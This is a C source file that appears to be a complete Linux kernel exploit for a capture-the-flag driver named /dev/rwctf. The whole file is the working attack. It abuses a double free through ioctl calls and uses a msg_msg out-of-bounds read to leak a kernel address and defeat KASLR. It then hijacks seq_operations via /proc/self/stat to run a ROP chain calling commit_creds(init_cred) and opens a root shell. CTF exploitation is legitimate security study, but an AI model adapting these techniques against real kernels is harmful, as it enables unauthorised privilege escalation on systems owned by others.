#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/wait.h>

#define INIT_IPC_NS 0xffffffff829ac6c0 
size_t pop_rdi = 0xffffffff8106ab4d; // pop rdi ; ret
size_t init_cred = 0xffffffff82850580;
size_t commit_creds = 0xffffffff81095c30;
size_t add_rsp_xx = 0xFFFFFFFF812A9811;// FFFFFFFF813A193A; 
size_t swapgs_kpti = 0xFFFFFFFF81E00EF3;

struct node {
	int idx;
	int size;
	char* ptr;
};

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int rw_fd;
int seq_fd;
void add(int idx, int size, char* ptr)
{
	struct node n = { .idx = idx, .size = size, .ptr = ptr };
	ioctl(rw_fd, 0xDEADBEEF, &n);
//	if (ioctl(rw_fd, 0xDEADBEEF, &n) < 0) info("Copy error in add function");
}

void dele(int idx)
{
	struct node n = { .idx = idx };
	ioctl(rw_fd, 0xC0DECAFE, &n);
}

struct msg_buf {
	long m_type;
	char m_text[1];
};

struct msg_header {
	void* l_next;
	void* l_prev;
	long m_type;
	size_t m_ts;
	void* next;
	void* security;
};

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	int qid;
	int shm_id;
	char* shm_addr;
	size_t kernel_offset;
	size_t buf[0x620] = { 0 };
	struct msg_buf* msg = (struct msg_buf*)buf;

	rw_fd = open("/dev/rwctf", O_RDWR);	
	if (rw_fd < 0) err_exit("Failed to open /dev/rwctf");

	add(0, 0x20, buf);
	dele(0);
	
	qid = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
	msg->m_type = 1;
	memset(msg->m_text, 'A', 0x1020);
	msgsnd(qid, msg, 0x1020-0x30-0x8, 0);
	
	dele(0);
	if ((shm_id = shmget(IPC_PRIVATE, 0x1000, 0600)) == -1) err_exit("shmget");
	if ((shm_addr = shmat(shm_id, NULL, 0)) == -1) err_exit("shmat");

	msgrcv(qid, buf, 0x1020-0x30-8, 0, IPC_NOWAIT|MSG_NOERROR);
	
	binary_dump("msg data", (char*)buf+0xfd0, 0x100);
	kernel_offset = *(size_t*)((char*)buf+0xfd8) - INIT_IPC_NS;
	hexx("kernel_offset", kernel_offset);

	puts("Hijack the Program Execution Flow");
	pop_rdi += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_kpti += kernel_offset;
	add_rsp_xx += kernel_offset;
	hexx("add_rsp_xx", add_rsp_xx);

	add(0, 0x20, buf);
	dele(0);

	seq_fd = open("/proc/self/stat", O_RDONLY);		
	dele(0);
	add(0, 0x20, &add_rsp_xx);

	asm(
	"mov r15, pop_rdi;"
	"mov r14, init_cred;"
	"mov r13, commit_creds;"
	"mov r12, swapgs_kpti;"
	);
	read(seq_fd, buf, 8);
	hexx("UID", getuid());
	system("/bin/sh");
    
	return 0;
}
